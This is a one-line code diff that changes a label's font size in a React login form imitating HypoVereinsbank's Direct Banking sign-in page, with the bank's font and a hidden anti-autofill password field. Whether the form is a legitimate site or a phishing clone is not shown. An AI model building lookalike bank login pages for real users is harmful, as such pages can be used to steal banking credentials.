@@ -340,7 +340,7 @@ const Hypovereinsbank = () => {
                   <input type="password" name="prevent_autofill_pw" autoComplete="new-password" style={{ display: "none" }} />
 
                   <label className="block mb-4">
-                    <span className="flex items-center gap-1.5 text-[15px] mb-1" style={{ color: DARK, fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>
+                    <span className="flex items-center gap-1.5 text-[16px] mb-1" style={{ color: DARK, fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>
                       Direct Banking Nummer
                       <InfoHint
                         open={openHint === "user"}
